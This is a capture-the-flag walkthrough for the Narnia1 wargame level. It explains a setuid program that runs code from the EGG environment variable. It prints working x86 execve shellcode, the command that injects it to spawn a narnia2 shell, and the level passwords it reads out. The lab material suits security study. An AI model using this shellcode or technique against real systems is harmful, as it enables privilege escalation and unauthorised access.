# Narnia1

- Username: narnia1
- Password: efeidiedae

Source code:

```c
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```

This code is going to execute whatever code is found in the environment variable
`EGG`. But what kind of code? Well, since `ret` is a pointer to the content of
the variable we can expect it to be machine code. So now we have to find out the
assembler instructions to open for example a shell and put those as bytes in the
`EGG`variable.
Luckily for us some researchers did us for us and submitted these so called
**shellcodes** to an online database on [shell-storm.org](http://shell-storm.org/shellcode/).

The target machine is running a Linux kernel on x86_64 architecture, as we can
see here:

```sh
narnia1@narnia:~$ uname -a
Linux narnia 4.18.12 #1 SMP Tue Oct 16 11:25:23 UTC 2018 x86_64 GNU/Linux
```

But the binary is a 32-bit ELF, so the right architechture is x86:

```sh
narnia1@narnia:~$ file /narnia/narnia1
/narnia/narnia1: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=328875c03e74c86e5dddfe88094a577f308ab167, not stripped
```

After trying a bunch of shellcodes, I found [this one](http://shell-storm.org/shellcode/files/shellcode-607.php).
It uses execve() to open a bash shell. Copy the bytes and use `xxd` or `echo -e`
to convert them to binary.

```sh
narnia1@narnia:~$ EGG=$(echo -ne "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8
\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f
\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81") /narnia/narnia1
Trying to execute EGG!
bash-4.4$ whoami
narnia2
bash-4.4$ cat /etc/narnia_pass/narnia2
nairiepecu
```
